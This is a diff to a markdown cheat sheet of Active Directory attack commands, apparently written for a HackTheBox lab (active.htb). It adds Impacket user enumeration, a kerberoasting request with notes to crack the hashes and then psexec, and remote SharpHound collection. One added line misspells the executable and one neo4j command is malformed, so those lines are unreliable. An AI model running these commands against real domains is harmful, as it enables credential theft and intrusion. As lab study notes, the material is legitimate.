@@ -15,6 +15,7 @@ kerbrute userenum --dc <IP> -d <domain.local> users.txt
 #### GetADUsers
 
 ```bash
+GetADUsers.py -all -dc-ip <IP> active.htb/svc_tgs   # Will need account creds
 ```
 
 #### GetNPUsers
@@ -38,6 +39,9 @@ crackmapexec smb <IP> -u <user> -p <password> --shares  # Check for SMB shares t
 #### GetUserSPNs
 
 ```bash
+GetUserSPNs.py -request -dc-ip <IP> active.htb/svc_tgs
+# Check for kerberoasted output
+# Crack found hashes then try to psexec
 ```
 
 #### secretsdump
@@ -99,6 +103,9 @@ Copy sharphound.exe to the target and run to gather information.
 ```powershell
 .\SharpHound.exe -c all
 # Will output a zip file to copy back to Kali
+
+# Running remotely in PowerShell
+.\SharphHound.exe -c all -d active.htb --domaincontroller <IP>
 ```
 
 ### Bloodhound
@@ -107,7 +114,7 @@ Run Bloodhound (and neo4j) then import zip file created by Sharphound
 
 ```bash
 # Run neo4j first
-sudo neo4j console
+sudo neo4j console/start
 # Run Bloodhound
 bloodhound --no-sandbox
 
